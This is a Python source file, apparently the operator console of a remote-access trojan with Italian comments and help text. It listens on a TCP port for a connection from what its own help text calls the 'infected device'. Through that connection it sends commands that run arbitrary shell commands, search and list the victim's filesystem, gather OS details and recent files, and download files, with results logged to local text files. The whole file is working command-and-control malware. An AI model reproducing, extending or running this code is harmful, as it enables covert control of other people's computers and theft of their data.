import os
from socket import *
import time
from threading import Thread

serverPort = 12018

windowsFlag = "n"
stop_threads = False
pwd = "unknown"


def animation():
    i = 0
    while True:
        global stop_threads
        if stop_threads:
            break
        if i < 10:
            print(".", end = "")
            i = i + 1
        else:
            print("\n")
            i = 0
        time.sleep(1)


def exitNClose(connectionSocket, cmd):
    connectionSocket.send(cmd.encode())
    out = connectionSocket.recv(1024).decode()
    connectionSocket.close()
    return True


def changeDirectory(connectionSocket):
    global pwd
    out = connectionSocket.recv(1024).decode()
    pwd = out
    print(out)


def getFile(connectionSocket: socket, fileName):
    existFile = connectionSocket.recv(1024).decode()
    connectionSocket.send("ok".encode())
    if existFile == "ok":
        fileSize = int(connectionSocket.recv(1024).decode())
        connectionSocket.send("ok".encode())
        file = open(fileName, 'wb')
        while fileSize > 0:
            if fileSize < 1024:
                out = connectionSocket.recv(fileSize)
            else:
                out = connectionSocket.recv(1024)
            fileSize = fileSize - 1024
            file.write(out)
            print("Ricevendo...")
        print("Ricevuto")
        file.close()
    else:
        print("File not found")


def StartConnection():  # funzione di connessione (da controllare)
    global serverPort
    print('opening the server \n')
    serverPort = serverPort
    serverSocket = socket(AF_INET, SOCK_STREAM)
    serverSocket.bind(('', serverPort))
    serverSocket.listen(1)
    print('Server Ready')
    while True:
        connectionSocket, addr = serverSocket.accept()
        print('Connesso', addr)

        if addr:
            break

    return connectionSocket


def AssegnaWinFlag(connectionSocket: socket):
    global windowsFlag
    windowsFlag = connectionSocket.recv(2).decode()


def LogOnFile(nomeFile: str, strPerFile: str):
    f = open(nomeFile, "w")
    f.write(strPerFile)
    f.close()


def searchFile(connectionSocket, fileName):
    output = ""
    global windowsFlag
    if windowsFlag == "w":
        cmd = "dir \"" + fileName + "\" /a /s"
        print(cmd)
    else:
        if fileName != "":
            cmd = "find -type f -name " + fileName
        else:
            cmd = "find -type f"
    connectionSocket.send(cmd.encode())  # 143
    print("Ricerca...")
    global stop_threads
    stop_threads = False
    t = Thread(target=animation)
    t.start()
    output = longRecv(connectionSocket) # 92 or 99
    stop_threads = True
    LogOnFile("ricercaFile.txt", output)


def longRecv(connectionSocket):
    numofpackets = int(connectionSocket.recv(1024).decode())
    output = ""

    while numofpackets > 0:
        data = connectionSocket.recv(1024)
        output += data.decode()
        numofpackets = numofpackets - 1

    print(output)
    return output


def recentFiles(connectionSocket: socket):
    global stop_threads
    stop_threads = False
    t = Thread(target=animation)
    t.start()
    output = longRecv(connectionSocket)
    stop_threads = True
    print(output)
    LogOnFile("rf.txt", output)


def clearScreen():
    global windowsFlag
    if windowsFlag == "w":
        os.system("cls")
    else:
        os.system("clear")


def main():
    global windowsFlag, pwd
    esc = False
    while not esc:
        try:
            connectionSocket = StartConnection()  # apriamo connessione e inizializziamo
            AssegnaWinFlag(connectionSocket)
            connectionSocket.send("cd .".encode())
            pwd = connectionSocket.recv(1024).decode()
            help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
                   "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
                   "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
                   "directory \ncls                             clear console\npwd                             print working directory \nsetOs to change osType" \
                   "\nrf [<data>YYYY-MM-DD]           mostra file più recenti [a partire da <data>]\nnsf [comando shell]             esegue comando shell [potrebbe crashare se non esiste]"
            while not esc:
                cmd = input('>>')
                connectionSocket.send(cmd.encode())

                if cmd == "cls":
                    print("cls")
                    clearScreen()

                elif cmd == "setOs":
                    global windowsFlag
                    windowsFlag = input()

                elif cmd == "esc":
                    esc = exitNClose(connectionSocket, cmd)
                    break

                elif "cd" in cmd:
                    changeDirectory(connectionSocket)

                elif "get " in cmd:
                    fileName = cmd.replace("get ", "")
                    if not fileName == "":
                        getFile(connectionSocket, fileName)

                elif cmd == "infoOs":
                    d = connectionSocket.recv(1024).decode()
                    print(d)
                    LogOnFile("infoOs.txt", d)

                elif "search" in cmd:
                    cmd = cmd + " "
                    toSearch = cmd.replace("search ", "")
                    searchFile(connectionSocket, toSearch)

                elif cmd == "help":
                    print(help)

                elif cmd == "pwd":
                    print(pwd)

                elif cmd == "rf" or "rf " in cmd:
                    if cmd == "rf":
                        recentFiles(connectionSocket)
                    elif "rf " in cmd:
                        data = cmd.replace("rf ", "")
                        if data > time.strftime("%Y:%m:%d"):
                            print("Too forward")
                        else:
                            recentFiles(connectionSocket)

                elif "dir" in cmd or "ls" in cmd:
                    output = longRecv(connectionSocket)

                elif "nsf" in cmd:
                    output = longRecv(connectionSocket)


        except Exception as e:
            print(e)
            print("Errore! Riavvio in corso")
            connectionSocket.close()


if __name__ == "__main__":
    main()
